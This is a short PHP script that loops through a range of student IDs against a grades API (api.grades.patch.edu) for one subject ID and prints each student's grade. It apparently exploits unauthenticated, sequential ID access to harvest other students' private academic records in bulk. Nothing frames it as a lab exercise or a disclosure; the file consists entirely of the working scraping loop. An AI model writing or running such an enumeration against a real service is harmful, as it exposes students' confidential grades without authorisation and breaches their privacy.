<?php
for ($id = 1111; $id < 9999; $id++) {
    $url = 'https://api.grades.patch.edu/grades?subjectid=1293&studentid=2022' . $id;
    $response = file_get_contents($url);
    $data = json_decode($response, true);
    
    if ($data) {
        echo "Student: 2022" . $id . ", Grade: " . $data['grade'] . "\n";
    } else {
        echo "Error fetching data for student: 2022" . $id . "\n";
    }
}
?>
